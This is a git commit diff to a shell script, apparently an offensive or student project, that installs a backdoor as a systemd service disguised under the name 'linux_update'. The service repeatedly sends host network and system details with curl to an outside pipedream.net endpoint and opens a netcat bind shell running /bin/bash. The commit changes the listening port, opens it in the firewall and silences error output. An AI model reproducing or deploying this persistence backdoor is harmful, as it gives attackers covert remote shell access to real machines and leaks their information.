da6d92945efa84d6bf9aeea52d6e33ccd182752f
skyf0l <tom.rorato@epitech.eu>
2021-06-22 14:25:35 +0200

    Update ib.sh

--- ib.sh
+++ ib.sh
@@ -20,11 +20,15 @@ Description=Systemd service.
 
 [Service]
 Type=simple
-ExecStart=/bin/bash -c 'while [ 1 ]; do (ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/ping_root_\$(uname -n) -X POST -d \"\$(</dev/stdin)\"; nc -lp 4444 --e /bin/bash; sleep 10; done'
+ExecStart=/bin/bash -c 'while [ 1 ]; do (ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/ping_root_\$(uname -n) -X POST -d \"\$(</dev/stdin)\"; nc -lp 44203 --e /bin/bash; sleep 10; done'
 
 [Install]
 WantedBy=multi-user.target
-" > /etc/systemd/system/linux_update.service
+" > /etc/systemd/system/linux_update.service 2> /dev/null
+
+firewall-cmd --permanent --add-port=44203/udp > /dev/null 2>&1
+firewall-cmd --permanent --add-port=44203/udp > /dev/null 2>&1
+firewall-cmd --reload > /dev/null 2>&1
 systemctl disable linux_update > /dev/null 2>&1
 systemctl stop linux_update > /dev/null 2>&1
 systemctl enable linux_update > /dev/null 2>&1
